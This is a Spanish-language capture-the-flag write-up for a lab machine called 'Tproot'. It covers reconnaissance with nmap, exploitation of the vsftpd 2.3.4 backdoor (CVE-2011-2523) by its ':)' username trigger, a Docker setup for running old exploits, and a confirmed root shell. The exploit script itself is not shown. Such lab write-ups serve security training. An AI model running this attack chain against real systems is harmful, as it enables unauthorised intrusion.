# Tproot

## 1. Reconocimiento Inicial de Puertos con Nmap

Realizamos un escaneo con `nmap` para detectar puertos abiertos y sus versiones. 

```bash
nmap -sC -sV --open <IP_DEL_OBJETIVO>
```

**Resultados Clave:**

*   `21/tcp open ftp vsftpd 2.3.4`: Esta versión específica es crítica
*   `80/tcp open http Apache httpd 2.4.58` La página por defecto de Apache

### 1.1. Enumeración Web (Descarte)

El acceso al puerto 80 muestra la página por defecto de Apache. Tras realizar una enumeración de directorios (fuzzing) sin obtener resultados relevantes, descartamos la web como vector de entrada principal y nos centramos en el servicio FTP.

## 2. Explotación del Servicio FTP

La versión `vsftpd 2.3.4` contiene una vulnerabilidad de tipo **Backdoor Command Execution** (CVE-2011-2523). El código malicioso fue introducido en el código fuente de la distribución oficial, permitiendo abrir una shell en el puerto 6200 si el nombre de usuario termina en `:)`.

### 2.1. Búsqueda de Exploits con Searchsploit

Utilizamos `searchsploit` para buscar exploits públicos relacionados con `vsftpd 2.3.4`. Confirmamos la existencia de múltiples scripts de explotación

```bash
searchsploit vsftpd 2.3.4
```

### 2.2. Preparación del Entorno (Estrategia Docker)

Los exploits antiguos de Python a menudo presentan problemas de compatibilidad en sistemas modernos (errores de `externally-managed-environment`, versiones de librerías obsoletas, etc.). Para mitigar esto, encapsulamos el entorno de ataque en un contenedor Docker.

1.  **Crear un Dockerfile:** Define un entorno con Python, herramientas necesarias y las dependencias específicas del exploit (como `paramiko==2.4.2`).

```dockerfile
# Imagen base con Python 3
FROM python:3.8-slim

# Evitamos preguntas interactivas en la instalación de paquetes
ENV DEBIAN_FRONTEND=noninteractive

# Actualizamos e instalamos dependencias útiles
RUN apt-get update && apt-get install -y \
    apt-utils \
    git \
    nano \
    curl \
    wget \
    iputils-ping \
    net-tools \
    inetutils-ping \
    openssh-client \
    procps \
    vim \
    && rm -rf /var/lib/apt/lists/*

# Creamos carpeta de trabajo
WORKDIR /exploit

# Copiamos todos los archivos locales al contenedor
COPY . /exploit

 # Instalamos versión antigua de Paramiko (necesaria para algunos exploits antiguos)
 RUN pip install paramiko==2.4.2

 # Al arrancar, dejamos un shell interactivo
ENTRYPOINT ["/bin/bash"]
```

2.  **Construir la imagen:** Compila el `Dockerfile` para crear una imagen Docker.

```bash
sudo docker build -t miimagen .
```

3.  **Ejecutar el contenedor:** Inicia el contenedor, montando un volumen para acceder a wordlists si es necesario.

```bash
sudo docker run -it --rm \
  -v /usr/share/wordlists:/wordlists \
  miimagen
```

### 2.3. Ejecución del Exploit

Una vez en un entorno adecuado (ya sea local o en el contenedor Docker), instalamos `pwntools` (necesaria para este exploit) y ejecutamos el script.

```bash
pip install pwntools
python3 exploit.py <IP_DEL_OBJETIVO>
```

Este exploit se conecta al servidor FTP, envía un comando específico que activa la puerta trasera y nos proporciona una shell remota con privilegios de `root`.

### 2.4. Verificación de Acceso

Confirmamos el compromiso del sistema.

```bash
whoami
# root
```
